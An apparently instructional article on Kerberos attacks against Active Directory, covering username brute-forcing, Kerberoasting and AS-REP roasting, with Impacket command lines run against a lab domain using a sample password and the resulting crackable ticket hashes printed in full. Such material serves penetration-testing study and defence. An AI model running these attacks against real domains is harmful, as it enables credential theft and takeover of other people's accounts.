# Introduction
This article will talk about Kerberos attacks in Active Directory. In order to understand these attacks, first let's go through how does Kerberos works.

### Tools
[Impacket](https://github.com/SecureAuthCorp/impacket) is a set of tools in Linux for Kerberos attacks

[Mimikatz](https://github.com/gentilkiwi/mimikatz) for Windows attacks

### 1. Kerberos brute-force
Kerberos is an authentication protocol, so it is possible to brute-force it. Moreover, Kerberos indicates, even if the password is wrong, whether the username is correct or not. This is advantageous for us to enumerate usernames in the domain. Requirement for this attacks are:
- Connection to the KDC
- Kerberos pre-authentication errors are not logged in Active Directory with a normal Logon failure event (4625), but rather with specific logs to Kerberos pre-authentication failure (4771).

### 2. Kerberoasting
Kerberos uses TGSs tickets to authenticate users to different services. These tickets are encrypted using users' password. Because of that, we would be able to request these tickets and crack users' credentials offline.
The requirement for this attacks is any domain accounts that can request TGS tickets.
##### Linux
To perform this attacks, we use a script from Impacket called [GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) to retrieve TGSs required for offline password cracking.
```bash
root@kali:impacket-examples# python GetUserSPNs.py jurassic.park/triceratops:Sh4rpH0rns -outputfile hashes.kerberoast
Impacket v0.9.18 - Copyright 2018 SecureAuth Corporation

ServicePrincipalName  Name          MemberOf  PasswordLastSet      LastLogon           
--------------------  ------------  --------  -------------------  -------------------
cloner/labwws02       velociraptor            2019-02-27 17:12:12  2019-03-05 09:35:27 



root@kali:impacket-examples# cat hashes.kerberoast 
$krb5tgs$23$*velociraptor$JURASSIC.PARK$cloner/labwws02*$b127187aceb93774a985bb1e528da85c$75cc3037a244f3422d6129bba79f79c67e79aca81b0b7dd551019424005abcfb8e232600fa968de2dcc9f10a44d13c17ac2be66bbb2640187dc174d81d9ebad0d691b36b3cbf4ca457678861748e2ab950f3066e0f50489415b934e4f6a2f2b7d8845cfd6a74279bad50da8c363174a07e51cbf39a2dd88bd74f1c839373cd9370ec1e2b7ebc5d6d05d49d34a75925d5983ab4849e211e57e93666f1fe9663b53620d2710e15f2c70837a4983db19c345b93f790244899b847d186197c37e966fc239ec750f91bd317fc2388ca421895052e2d57f742ab45c59275e95dfbb855ff11e5e893631164f6053ca0a6162c6b1be3ccdeb7fe2ce3a8634411b2b16ef03f558a5e0156bb8270ece6cf6b516af8172aa6071904d493c6fdf91738781371b68dfd9b4e1c2d6bcef3d665504194a703b08615d1b9c57ac794c37ab44dc2d57dff9677b0168aa7c078b190dddb2091ab63ca85868944cdbb4229a7a291028f193f94cb5c9a43c55b006cdd35df241b49d5464d3c05d5b7ec9eecd843335e45642892333b9760d06bc445d02558c2c30a2648a1018bc8493b8f73a6b0c07ffd052434239f0463b2344363656d6b6640efdc3e10fab04b99fc1f1487942c2b2c9ca7e89447aab3b1fb5adcb4b820d842a2ec713b788358e5c14d8ac3f0070058e6453297d4fb9538680ab152ce4ed3168cc6a58cc1c753b15d5de7fb98132ac3eec602ad611e8e03ed1c00c2bfa3b5bec1ea93f24b68b54fe48726f4e650dba34b3c4696b5f5e743cb5ace4b9b073dc718070d06e8f872abef2d4040350cd9e09091da47ab2fcef2e0d873afdcb9d7cf2236131f312d4e23004eb598efa064b871af82e618c31a2e82d28bc635ac3cbd000d725dd53217fb484178de3cd9bf4d20819c30c189ccc2ae349a333b628c6d41d01163b918def5ba089ac2cc6ff673dd64e1c2fef25fb599e009c1eca8e9e06cebc61fb0e7fc6922bc3edbdc60dd85a3f5b7412e8e46db80b55f577cc682892e66987a0e920872292a5cdd0f1a11fcc294461ccf86a53e75c9c8b0f9688919b4484986b7bcfb7612b117f98f5b0f4bf44ef0ad07245883ced1045b215a137d50a54f45a67168e6bed3dcb41f25b8ac307a4f3923d1545f0f6f1593db0a8b3032a3837b5c1715656e73c3ba0102e76dbbf47388bb5d1c334fc50598a57914a77c4c11059fe1b07b6342286ec2f6f38e7a5a946f40b7de01707f9681228904cb04434063c3dc7a6d26f301664514551ee20b69eb76d2a3f8fbc45b0d9cf9d236f8ac880c75b140dc471e6044b1c85af0e26393e057c5357f8ef223e845676e963eba6540d2cbee90cbb6d2422e9b1e34e6b2989a752c09b86d302219a45cd219f3fdf243f9b5c7002997daeff03f7cd437
```

After having the TGSs ticket, we can use [hashcat](https://github.com/hashcat/hashcat) to crack the ticket

### 3. ASREP-Roasting
Users account are vulnerable to this attack when it does not have Kerberos pre-authentication enabled. With this option, anyone can send an AS_REQ request to the DC on behalf of any of those users, and receive an AS_REP message. This last kind of message contains a chunk of data encrypted with the original user key, derived from its password. Then, by using this message, the user password could be cracked offline.
The only requirement for this attack is the connection to the DC. However, with a domain account, a LDAP query can be used to retrieve users without Kerberos pre-authentication in the domain. Otherwise usernames have to be guessed.

![alt text](https://i.stack.imgur.com/n56xn.png)

##### Linux
To perform this attacks, we use a script from Impacket called [GetNPUsers.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py) to gather users do not have Kerberos pre-authentication enabled. 

```bash
root@kali:impacket-examples# python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
Impacket v0.9.18 - Copyright 2018 SecureAuth Corporation

Name          MemberOf                                       PasswordLastSet      LastLogon            UAC      
------------  ---------------------------------------------  -------------------  -------------------  --------
velociraptor  CN=Domain Admins,CN=Users,DC=jurassic,DC=park  2019-02-27 17:12:12  2019-03-18 11:44:04  0x410200 



root@kali:impacket-examples# cat hashes.asreproast 
$krb5asrep$23$velociraptor@JURASSIC.PARK:6602e01d59b4eeba815ab467194a9de4$b13a0e139b1daa46a457b3fa948c22cbbaad75a94c2b37064d757185d171c258e290210339d950b9245de6fa40a335986146a8c71c0b60f633b4c040141460a0a91737670f21caae6261ebde0151c06adceac22bfed84cb8c1f07948fb8e75b8a1d64c768c9e3f3a50d035ec03df643ea185648406b634b6fd673028e6e90ea429f57f9229b00f47f2bba2cdb7297d29b9f97a83d07c89dee7ea673340f64c443a213d5b9bbed969a68ca7a0ea41245b0fa985f64261803488b61821fbaedf43d50ea16075b2379bb354e4001d73dfd19cc8787b4bcd2bd9b542e0e2b1218ee8c16699c134ae5ec587afe0fd1880
```


### References
Impacket: https://github.com/SecureAuthCorp/impacket

Mimikatz:  https://github.com/gentilkiwi/mimikatz

Kerberos attacks: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast


